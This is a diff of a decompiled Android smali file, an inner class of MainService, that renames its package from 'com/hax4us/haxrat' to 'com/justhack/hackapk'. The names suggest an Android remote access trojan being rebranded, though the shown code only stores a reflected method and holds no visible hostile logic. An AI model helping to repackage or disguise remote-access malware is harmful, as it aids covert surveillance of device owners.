@@ -1,4 +1,4 @@
-.class Lcom/hax4us/haxrat/MainService$100000001;
+.class Lcom/justhack/hackapk/MainService$100000001;
 .super Ljava/lang/Object;
 .source "MainService.java"
 
@@ -8,7 +8,7 @@
 
 # annotations
 .annotation system Ldalvik/annotation/EnclosingClass;
-    value = Lcom/hax4us/haxrat/MainService;
+    value = Lcom/justhack/hackapk/MainService;
 .end annotation
 
 .annotation system Ldalvik/annotation/InnerClass;
@@ -37,7 +37,7 @@
 
     move-object v4, v1
 
-    iput-object v4, v3, Lcom/hax4us/haxrat/MainService$100000001;->val$currentApplication:Ljava/lang/reflect/Method;
+    iput-object v4, v3, Lcom/justhack/hackapk/MainService$100000001;->val$currentApplication:Ljava/lang/reflect/Method;
 
     return-void
 .end method
